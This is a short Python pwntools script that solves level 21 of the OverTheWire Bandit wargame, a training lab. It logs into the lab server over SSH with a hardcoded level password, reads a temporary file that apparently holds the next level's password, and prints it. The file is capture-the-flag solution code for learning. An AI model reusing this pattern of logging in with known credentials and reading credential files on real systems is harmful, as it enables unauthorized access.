#!/usr/bin/env python
from pwn import *

log.info('overthewire.org - bandit21 exploit by SKane')

shell = ssh('bandit21', 'bandit.labs.overthewire.org', password='gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr', port=2220)

sh = shell.run('sh')

sh.sendline('cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv')

log.success("Password for bandit22: " + sh.recvline())
